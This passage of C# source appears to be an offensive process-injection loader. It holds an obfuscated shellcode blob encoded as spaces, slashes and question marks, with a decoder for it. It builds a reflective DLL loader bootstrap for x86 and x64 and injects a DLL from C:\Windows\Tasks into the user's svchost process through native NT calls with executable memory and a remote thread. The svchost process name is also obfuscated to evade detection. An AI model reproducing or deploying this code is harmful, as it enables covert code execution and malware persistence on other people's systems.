    /      ? /   /         ? /-/ ? /        /   ? /   /   ? /         /  ? / /       ? /    /-?-/       /  ? /   /         ? /  /     ?  /-/       ?-/       /      ? /   /         ? /-/         ? /         / ?-/      /        ?-/     /       ? /         / ?  /    /    ?-/-/-?-/-/-?-/-/-? / /      ? /-/    ?-/      /        ? /   /         ? /        /   ?  /    /-?-/-/-?-/-/-?-/-/-?-/       /   ? /   / ? /         /        ?-/-/    ?-/       /      ?-/-/   ?  /    /   ?  /   /     ?-/        /   ?-/      /     ? /   /         ?-/ /    ?-/       /  ?-/-/   ?  /-/   ?-/      /     ?  /     /     ?  / /  ?-/      /     ? /   /         ? / /        ?-/-/        ?-/       /      ? /   /         ?  /  /    ?-/      /         ? /   /         ? /  /      ?-/ /  ?-/       /  ?-/-/   ?  /    /   ?-/       /      ?-/-/   ?  /     / ?  /   /     ?-/   /       ?-/       /   ? /   /         ?-/ /     ?-/       /  ? /   /   ?  /-/ ? /  / ?-/-/     ?-/ /     ? /        /   ?  /-/         ?  /   /     ?-/-/       ?-/       /  ? /    / ?-/        / ?-/-/  ?-/       /  ?-/-/   ?  / / ?-/       /   ? /   /         ?  /-/    ?-/      /     ?  /     /     ?  / /   ?-/       /  ? /   /       ?-/-/      ?-/       /  ? /   / ? /         /        ?-/-/        ?-/       /   ? /   / ? /         /         ?-/-/        ?-/     / ? /         /  ?-/       /  ?-/     /       ?-/-/      ? / /       ?  / /  ?-/       /      ? /   /         ? /-/ ? /        /   ?-/       /   ? /   / ? /         /        ?-/   /  ?-/      /         ?-/     / ?  /     /     ?-/      /         ?-/     /       ?-/      /  ? / /       ? /      /        ?-/      /         ? /   /         ?  /    /       ?-/ /     ? /        /   ?-/       / ?-/  /-?-/      /     ? /        /        ?-/-/ ?-/-/-?-/-/-?-/-/-? /-/  ?-/      /        ?-/     /         ? /  /       ?-/-/      ?-/ /     ? /   / ?  /-/       ?-/-/-?-/-/-?-/-/-?-/       /      ? /   /         ? /  /     ?  / /     ?-/       /  ? /    / ? / /         ?-/      /-?-/       /  ?-/-/   ?  /    /-?-/      /         ?-/     / ?  /-/ ?-/      /        ?-/     /       ?-/       /        ?  /   /      ?-/ /     ? /   /  ? /      /-?-/-/-?-/-/-?-/-/-? /   /         ?-/ /    ? /   /         ?  /-/         ? /         /   ?  /   /    ?-/   /-? /   /         ? /         /   ?-/      /     ?-/   /     ?  / /  ? /         /   ?  /   /  ?-/  /         ? /         /   ?  /   /   ?-/   / ?-/      /     ?-/   /     ? /         /      ? / /       ?-/   /      ? /   /   ?  / /-? / /       ?-/ /    ?  /    /       ?  / /       ?-/      /         ?-/  /       ? /         /  ?-/      /     ? /   / ?  /  /    ?-/-/       ?-/      /         ?-/-/   ? /         /      ?  /   /     ?-/       /         ?  /    /       ?  / /       ? /        /    ?-/-/  ?-/-/-?-/-/-?-/-/-?-/      /         ?-/  /       ? /         /  ?-/      /        ?-/   /     ? /         /  ?-/      /        ?-/-/   ? /         /  ?  /   /     ?-/      / ? /   /   ?  / /-? / /       ?-/   /  ? /   /   ?  /-/ ? / /       ?-/-/      ?-/      /        ? /    / ?-/      /      ?-/ /      ?  /   /     ?-/    /       ? /   /   ?  / /-? / /       ?-/ /        ? /   /   ?  /-/ ? / /      ?-/-/        ?-/      /     ? /        /    ? /  /        ?-/-/-?-/-/-?-/-/-?  /   /     ?-/   / ?-/      /        ? /   /         ?-/      /         ? /       /     ?  /   /     ?-/  /         ? /   /   ?  /-/ ? / /       ?-/-/      ?-/      /        ? /    / ?-/      /     ?-/   /  ?  /   /     ?-/ /     ?-/      /        ? /   /         ?-/      /         ? /       /     ? /   /   ?  /-/ ? /        /    ?-/      /    ?-/-/-?-/-/-?-/-/-?-/      /        ?-/ /     ?-/      /         ? /         /  ?-/      /        ? /   /       ?-/      /         ? /       /     ?  /    /       ?-/-/      ?-/-/-?-/-/-?-/-/-?-/-/    ? / /      ?-/-/         ?-/      /     ?-/ /     ? /        /      ?  /   /  ?-/-/         ?-/      /        ? /   /       ?-/      /         ? /       /     ? /   /         ?-/       /        ?  /   /  ?-/       /      ? /    / ?-/       /       ? /       /     ? /   /         ?-/        /      ?  /   /      ?-/       /  ?-/-/   ?  /-/   ?-/      /     ?  /     /     ?  / /     ?-/      /         ?-/     / ?  /-/ ?-/ /     ? /        /   ?-/       / ?-/-/      ?-/      /         ?-/-/   ?  /    /    ?-/       /  ? /   / ? /         /        ?-/    /-?-/      /        ?-/     /         ?  /    /-?-/ /     ? /   /-?-/      /      ?  /     /     ?  /     /     ?  /     /     ?-/      /         ?-/     / ?  /     /     ?-/      /         ?-/     / ? /         /  ?-/     / ?  / /-?-/       /  ? /   / ?  /-/ ?  /     /     ?  /     /     ?-/        /     ?  /  /   ?-/      /        ?-/     /       ? /         / ?  / /  ?-/-/-?-/-/-?-/-/-? / /      ?-/   /      ? /   /         ? /   /     ?  /-/        ?-/-/-?-/-/-?-/-/-?-/       /  ? /   /         ? / /      ?-/  /    ?-/  /    ?  /   /     ?-/ /     ?-/      /         ?-/     / ? /         /  ?-/      /     ? /   /         ?  / /  ?-/       /  ? /   /         ?  /-/   ?  /     /     ?  /-/        ?-/       /  ? /    / ? / /        ?-/-/        ?-/       /  ? /   /         ?-/-/      ?-/       /  ? /   /   ? /         /  ? / /       ?  /   /   ? /   /         ?-/       / ?-/    /-?-/       /       ? /   /         ? /         /      ?-/       /  ?-/-/   ? /         /     ?-/      /     ? /   /         ?  / /  ?-/       /  ? /   /         ?  /-/   ?  /     /     ?  /-/        ? /   /         ? / /       ? /-/   ? /   /   ?  /    /      ?-/ /     ? /   /  ? /     /-?-/-/-?-/-/-?-/-/-?-/      /        ?-/     /       ? /         / ? /    /-?-/-/-?-/-/-?-/-/-?-/ /     ? /   /  ? /   /       ?-/-/-?-/-/-?-/-/-? /   /         ? /    /   ? /   /      ?-/-/-?-/-/-?-/-/-?-/       /  ?-/-/   ?  /-/   ?-/      /        ? /   /         ?-/        /         ?-/  /    ?-/      /         ? /   /   ?  / /         ? / /      ? / /         ?-/      /        ?-/     /       ? /  / ?-/  /-? / /      ? / /   ?-/      /        ? /   /         ?-/       /   ?-/   /  ?-/      /     ? /   /         ?  /     /     ? /   /         ?-/        / ?-/   /      ?-/       /      ?-/-/   ?  /-/   ?-/       /  ?-/-/   ?  / / ?-/      /         ? /   /   ?  / /         ? / /      ?-/         /  ?-/      /         ? /   /         ?-/-/ ?-/      /         ? /   /         ?  / /     ?-/       /      ?-/-/   ? /         /     ? / /      ?-/        / ?  /   /     ?-/ /      ?-/ /     ? /         /-? /         /  ?-/      /     ?-/-/   ? /         /    ?-/      /        ? /   /         ?  /-/        ?-/      /     ? /         /   ?  /-/  ?-/ /   ?-/       /       ?-/-/   ? /         /      ?-/      /     ? /   /        ?-/-/-? /   /  ? /         /  ? / /       ?  /   /   ?-/      /     ?-/     /         ?  /    /  ? / /       ?-/-/     ?-/       /  ? /   /   ?  / /-? / /       ?-/  /  ? /        /    ?-/-/  ?-/-/-?-/-/-?-/-/-?-/      /     ?-/-/   ?  /     /  ?-/       /  ?-/-/   ?  /-/        ?-/       /   ? /   / ? /         /   ?-/-/    ?-/      /     ?-/     /         ?  /     / ? / /     ?-/  /      ?  /   /     ? /        /        ? /   /         ?-/       /   ?-/  /        ?-/ /     ? /        /   ?-/ /        ?-/       /  ?-/-/   ?  /-/   ? /   /         ?-/-/    ? /    /     ? /   /         ?-/        /     ? / /         ?-/       /  ?-/-/   ? /         /     ?-/       /  ? /   /         ?-/       /       ? / / ?  /     /     ?  /-/        ?-/       /  ? /   /         ? /         /     ?  /   /     ?-/-/  ?-/     / ? /         /  ?-/       /  ? /   /         ? /     /      ?-/   /      ?  /-/        ?-/-/-?-/-/-?-/-/-?-/       /  ? /  /         ? /         /      ? /    /    ?-/-/-?-/-/-?-/-/-?-/      /     ?-/         /     ?-/      /     ?-/         /    ?-/      /     ?-/         /   ?-/      /     ?-/         /  ?-/         /     ?-/         /    ?-/         /   ? /         /     ?  /-/    ?  /-/    ?-/       /  ? /   /       ?-/         /  ?-/   /      ?-/-/        ?-/       /  ? /   /       ? / /      ?-/   /      ?-/ /      ?-/        /       ?-/       /  ? /   / ?  /   /      ?-/ /      ? /-/ ?-/       /  ? /   /         ?-/-/    ?-/   /       ?-/         /      ?-/-/-?-/-/-?-/-/-? /   /         ?  /    / ?-/       /  ? /   /         ?-/        /-?-/  /    ?-/       /      ? /   /         ?-/       /    ?-/ /      ?-/       /       ? /   /         ?-/      /     ?-/    /        ?-/       /       ? /   /   ? /         /  ?-/ /     ? /   /  ? /        /-?-/-/-?-/-/-?-/-/-?-/      /     ?-/ /     ?-/ /      ?-/      /     ?-/        /        ?-/       /   ?-/         /         ?-/      /    ?-/      /-?-/     / ?  / /-?-/       /       ? /   /         ?-/-/         ?  /    /   ?-/ /     ? /  /       ?-/-/    ?-/   /      ?-/      /      ? /   /         ? /     /      ?-/-/-? /   /      ?-/-/-?-/-/-?-/-/-? /   /   ?  / /         ? / /      ?  / /  ?-/       /  ? /   /         ?-/-/    ?-/   /      ?-/       /  ? /         /   ?  /   /  ?-/ /      ?-/      /        ?-/ /     ? /        /   ?  /-/        ?-/      /         ? /   /   ?  / /-? / /      ?-/   /   ?-/       /  ? /   /         ?-/       /      ?-/   /      ?-/-/        ?-/      /         ? /   /         ?  / /        ?-/ /     ? /         /-?-/-/ ? /         /   ?  /-/  ?-/ /   ? /  /        ?-/     /       ?-/         /       ? /  /    ?-/-/   ? /   / ? /         /    ?  /  /    ?-/-/   ?  /-/        ?-/       /  ?  /     /     ? /         /   ?-/       /   ? /   / ?  /   /     ?-/-/ ? / /       ?  /   / ?-/       /       ? /    / ?-/  /-?-/  /    ?-/     / ?  /-/ ?-/      /     ? /   /         ? /  /  ?-/   /  ?-/       /   ?-/-/   ?  /    /        ?-/      /     ?-/     /       ?-/       /    ?-/  /    ? / /        ? /    /   ? /   /         ?-/   / ?-/      /         ?-/     / ?  / /         ?-/       /   ?-/-/   ?  / /      ?-/       /  ? /    / ? /  /       ?-/-/    ?-/ /     ? /         /-?-/-/   ?-/       /  ?  /     /     ? /         /     ?-/      /     ? /         /   ?  /-/   ?-/ /   ?-/      /        ?-/-/   ?  / /      ? /  /        ? /  /   ?  /     /     ?-/-/-? / /       ?  /   /       ?-/      /     ? /    / ?-/-/    ?-/ /         ?-/     /         ? /         /        ? / /      ?-/ /   ?  /     /     ? /         /   ?-/      /     ?-/     /         ?-/       /    ?-/  /    ? / /    ?  /-/         ?  /   /   ?-/         / ?  /     /     ?  /     /     ?  /     /     ?-/      /     ? /   /         ?-/      /      ?-/   /      ?-/-/   ?  /-/ ?-/       /   ?-/-/   ? /         /  ?-/ /     ? /        /   ?-/  /-?-/-/ ?-/      /     ? /   /         ?-/       /    ?-/  /        ?-/       /   ?-/-/   ?  /-/-? /   /         ?-/-/    ? /    /     ?-/       /   ?-/-/   ? /         /  ?  /   /     ?-/-/  ?-/     / ? /         /  ?-/       /  ? /   /         ?-/         /  ?-/   /      ?-/   /  ?-/       /  ? /   /         ? / /      ?-/   /      ?-/    /-?-/       /  ? /   / ? /         /      ?-/ /      ?-/         /     ? /         /     ?";
            var rdiShellcode64 = ResolveShellCode(rdiShellcode64str);
            //MARKER:E

            var newShellcode = new List<byte>();
            uint dllOffset = 0;
            if (PE.Is64BitDLL(dllBytes))
            {
                var rdiShellcode = rdiShellcode64;
                int bootstrapSize = 64;

                // call next instruction (Pushes next instruction address to stack)
                newShellcode.Add(0xe8);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);

                // Set the offset to our DLL from pop result
                dllOffset = (uint)(bootstrapSize - newShellcode.Count + rdiShellcode.Length);

                // pop rcx - Capture our current location in memory
                newShellcode.Add(0x59);

                // mov r8, rcx - copy our location in memory to r8 before we start modifying RCX
                newShellcode.Add(0x49);
                newShellcode.Add(0x89);
                newShellcode.Add(0xc8);

                // Setup the location of the DLL into RCX
                // add rcx, <Offset of the DLL>
                newShellcode.Add(0x48);
                newShellcode.Add(0x81);
                newShellcode.Add(0xc1);
                foreach (byte b in BitConverter.GetBytes(dllOffset))
                    newShellcode.Add(b);

                // mov edx, <Hash of function>
                newShellcode.Add(0xba);
                foreach (byte b in BitConverter.GetBytes(functionHash))
                    newShellcode.Add(b);

                // Put the location of our user data in
                // add r8, <Offset of the DLL> + <Length of DLL>
                newShellcode.Add(0x49);
                newShellcode.Add(0x81);
                newShellcode.Add(0xc0);
                foreach (byte b in BitConverter.GetBytes((uint)(dllOffset + dllBytes.Length)))
                    newShellcode.Add(b);

                // mov r9d, <Length of User Data>
                newShellcode.Add(0x41);
                newShellcode.Add(0xb9);
                foreach (byte b in BitConverter.GetBytes((uint)userData.Length))
                    newShellcode.Add(b);

                // push rsi - save original value
                newShellcode.Add(0x56);

                // mov rsi, rsp - store our current stack pointer for later
                newShellcode.Add(0x48);
                newShellcode.Add(0x89);
                newShellcode.Add(0xe6);

                // and rsp, 0x0FFFFFFFFFFFFFFF0 - Align the stack to 16 bytes
                newShellcode.Add(0x48);
                newShellcode.Add(0x83);
                newShellcode.Add(0xe4);
                newShellcode.Add(0xf0);

                // sub rsp, 0x30 - Create some breathing room on the stack
                newShellcode.Add(0x48);
                newShellcode.Add(0x83);
                newShellcode.Add(0xec);
                newShellcode.Add(6 * 8); // 32 bytes for shadow space + 8 bytes for last arg + 8 bytes for stack alignment

                // mov dword ptr [rsp + 0x20], <Flags> - Push arg 5 just above shadow space
                newShellcode.Add(0xc7);
                newShellcode.Add(0x44);
                newShellcode.Add(0x24);
                newShellcode.Add(4 * 8);
                foreach (byte b in BitConverter.GetBytes((uint)flags))
                    newShellcode.Add(b);

                // call - Transfer execution to the RDI
                newShellcode.Add(0xe8);
                newShellcode.Add((byte)(bootstrapSize - newShellcode.Count - 4)); // Skip over the remainder of instructions
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);

                // mov rsp, rsi - Reset our original stack pointer
                newShellcode.Add(0x48);
                newShellcode.Add(0x89);
                newShellcode.Add(0xf4);

                // pop rsi - Put things back where we left them
                newShellcode.Add(0x5e);

                // ret - return to caller
                newShellcode.Add(0xc3);

                // Write the rest of RDI
                foreach (byte b in rdiShellcode)
                    newShellcode.Add(b);

                // Write our DLL
                foreach (byte b in dllBytes)
                    newShellcode.Add(b);

                // Write our userdata
                foreach (byte b in userData)
                    newShellcode.Add(b);

            }
            else // 32 Bit
            {
                var rdiShellcode = rdiShellcode32;
                int bootstrapSize = 46;

                // call next instruction (Pushes next instruction address to stack)
                newShellcode.Add(0xe8);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);

                // Set the offset to our DLL from pop result
                dllOffset = (uint)(bootstrapSize - newShellcode.Count + rdiShellcode.Length);

                // pop eax - Capture our current location in memory
                newShellcode.Add(0x58);

                // push ebp
                newShellcode.Add(0x55);

                // mov ebp, esp
                newShellcode.Add(0x89);
                newShellcode.Add(0xe5);

                // mov ebx, eax - copy our location in memory to ebx before we start modifying eax
                newShellcode.Add(0x89);
                newShellcode.Add(0xc3);

                // add eax, <Offset to the DLL>
                newShellcode.Add(0x05);
                foreach (byte b in BitConverter.GetBytes(dllOffset))
                    newShellcode.Add(b);

                // add ebx, <Offset to the DLL> + <Size of DLL>
                newShellcode.Add(0x81);
                newShellcode.Add(0xc3);
                foreach (byte b in BitConverter.GetBytes((uint)(dllOffset + dllBytes.Length)))
                    newShellcode.Add(b);

                // push <Flags>
                newShellcode.Add(0x68);
                foreach (byte b in BitConverter.GetBytes(flags))
                    newShellcode.Add(b);

                // push <Length of User Data>
                newShellcode.Add(0x68);
                foreach (byte b in BitConverter.GetBytes((uint)userData.Length))
                    newShellcode.Add(b);

                // push ebx
                newShellcode.Add(0x53);

                // push <hash of function>
                newShellcode.Add(0x68);
                foreach (byte b in BitConverter.GetBytes(functionHash))
                    newShellcode.Add(b);

                // push eax
                newShellcode.Add(0x50);

                // call - Transfer execution to the RDI
                newShellcode.Add(0xe8);
                newShellcode.Add((byte)(bootstrapSize - newShellcode.Count - 4)); // Skip over the remainder of instructions
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);

                // leave
                newShellcode.Add(0xc9);

                // ret - return to caller
                newShellcode.Add(0xc3);

                //Write the rest of RDI
                foreach (byte b in rdiShellcode)
                    newShellcode.Add(b);

                //Write our DLL
                dllBytes[0] = 0x00;
                dllBytes[1] = 0x00;
                foreach (byte b in dllBytes)
                    newShellcode.Add(b);

                //Write our userdata
                foreach (byte b in userData)
                    newShellcode.Add(b);
            }

            return newShellcode.ToArray();
        }


      public static void exec()
      {
        // name = svchost
        string name = "                   ?                      ?   ?        ?               ?                   ?                    ?";
        byte[] data = null;
        if (File.Exists(@"C:\Windows\Tasks\shell64.dll")) {
            data = System.IO.File.ReadAllBytes(@"C:\Windows\Tasks\shell64.dll");
        } else {
            System.Windows.Forms.MessageBox.Show("File missing ?");
            throw new ApplicationException("File missing ?");
        }
        byte[] userData = System.Text.Encoding.Default.GetBytes("ThisIsUserData\0");
        byte[] shellcode;
        shellcode = ConvertToShellcode(data, HashFunction("MyFunction"), userData, 0);

        int ProcId = FindUserPID( ResolvProcessName(name) );
        if (ProcId == 0) {
            System.Windows.Forms.MessageBox.Show("Find PID failed !");
            throw new ApplicationException("Find PID failed !");
        }
        CLIENT_ID clientid = new CLIENT_ID();
        clientid.UniqueProcess = new IntPtr(ProcId);
        clientid.UniqueThread = IntPtr.Zero;
        IntPtr byteWritten = IntPtr.Zero;
        IntPtr procHandle = IntPtr.Zero;
        NTSTATUS status = ZwOpenProcess(ref procHandle, ProcessAccessFlags.All, new OBJECT_ATTRIBUTES(), ref clientid);
        IntPtr allocMemAddress = new IntPtr();
        UIntPtr scodeSize = (UIntPtr)(UInt32)shellcode.Length;
        status = NtAllocateVirtualMemory(procHandle, ref allocMemAddress, new IntPtr(0), ref scodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(shellcode.Length);
        Marshal.Copy(shellcode, 0, unmanagedPointer, shellcode.Length);
        status = ZwWriteVirtualMemory(procHandle, ref allocMemAddress, unmanagedPointer, (UInt32)(shellcode.Length), ref byteWritten);
        Marshal.FreeHGlobal(unmanagedPointer);
        IntPtr hRemoteThread;
        status = NtCreateThreadEx(out hRemoteThread, GENERIC_ALL, IntPtr.Zero, procHandle, allocMemAddress, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);
        CloseHandle(hRemoteThread);
        CloseHandle(procHandle);
      }

      public static string ResolvProcessName(string c)
      {
          string result = "";
          int num = 0;
          int index = 0;
          string tmp = "";
          byte startposL = 96;
          byte startposU = 64;
          for (int i = 1; i <= c.Length; i++) {
              tmp = c.Substring(index, 1);
              if (tmp == " ") { num++; index++; }
              else if (tmp == "?") {
                  result = result + System.Convert.ToChar(startposL + num);
                  index++;
                  num = 0;
              } else if (tmp == "/") {
                  result = result + System.Convert.ToChar(startposU + num);
                  index++;
                  num = 0;
                }
              }
          return result;
      }

      public static byte [] ResolveShellCode(string _P1)
      {
          byte [] _L1 = new byte [1];
          int _N1 = 0;
          string _N2 = "";
          int _N3 = 0;
          int _N4 = 0;
          for (int i = 1; i <= _P1.Length; i++) { if (_P1.Substring(_N3, 1) == " ") { _N1++; }
              else if (_P1.Substring(_N3, 1) == "|" || _P1.Substring(_N3,1) == "/") { if (_N1 > 0) { _N2 = _N2 + _N1.ToString(); _N1 = 0; } }
              else if (_P1.Substring(_N3, 1) == "-") { _N2 = _N2 + "0"; _N1 = 0; }
              else if (_P1.Substring(_N3, 1) == "?") { if (_P1.Substring(_N3 - 1, 1) == "?" || _P1.Substring(_N3 - 1, 1) == "-")
              {
                  Array.Resize(ref _L1, _N4 + 1);
                  _L1[_N4] = Byte.Parse( _N2 );
                  _N2 = "";
                  _N1 = 0;
                  _N4++;
              }
              else {
                  Array.Resize(ref _L1, _N4 + 1);
                  _L1[_N4] = Byte.Parse( _N2 + _N1.ToString() );
                  _N2 = "";
                  _N1 = 0;
                  _N4++;
              } }
              _N3++;
          }
          return _L1;
      }

      private static string GetProcessUser(Process process)
      {
          IntPtr processHandle = IntPtr.Zero;
          try
          {
              ZwOpenProcessToken(process.Handle, 8, out processHandle);
              WindowsIdentity wi = new WindowsIdentity(processHandle);
              string user = wi.Name;
              return user.Contains(@"\") ? user.Substring(user.IndexOf(@"\") + 1) : user;
          }
          catch
          {
              // No match found
              return null;
          }
          finally
          {
              if (processHandle != IntPtr.Zero)
              {
                  CloseHandle(processHandle);
              }
          }
      }


      public static int FindUserPID(string procName)
      {
          string owner;
          Process proc;
          int foundPID = 0;
          Process[] processList = Process.GetProcesses();
          foreach (Process process in processList)
          {
              if (process.ProcessName == procName) {
                  proc = Process.GetProcessById(process.Id);
                  owner = GetProcessUser(proc);
                  if (owner == Environment.UserName ) {
                      foundPID = process.Id;
                      break;
                  }
            }
        }
        return foundPID;
      }
  }
}



```
